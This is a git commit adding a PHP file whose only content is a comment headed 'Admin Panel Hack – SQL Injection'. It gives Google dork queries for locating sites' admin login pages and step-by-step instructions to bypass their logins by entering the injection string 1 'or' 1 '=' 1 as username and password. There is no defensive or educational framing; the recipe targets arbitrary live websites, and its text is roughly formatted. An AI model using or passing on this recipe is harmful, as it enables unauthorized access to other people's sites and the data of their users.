d5a9c813fe7c6127b7689410813d7ea3e2728b33
Md. Imran Hosen <33275522+MdImranHosen@users.noreply.github.com>
2021-11-08 18:53:23 +0600

    cyber s 1st

---
+++ cyber_security.php
@@ -0,0 +1,10 @@
+//////////////////************  Admin Panel Hack – SQL Injection **************\\\\\\\\\\\\\\\\\\\\
+/*
+Intitle:”index” of “admin”site.in
+Inurl:/admin/index.php / login.php/ user.php
+1.	Search Google -> Admin/index.php
+2.	Open Website Url: www. Like . com/ admin
+3.	Username: 1 'or' 1 '=' 1
+4.	Password:  1 'or' 1 '=' 1
+
+*/
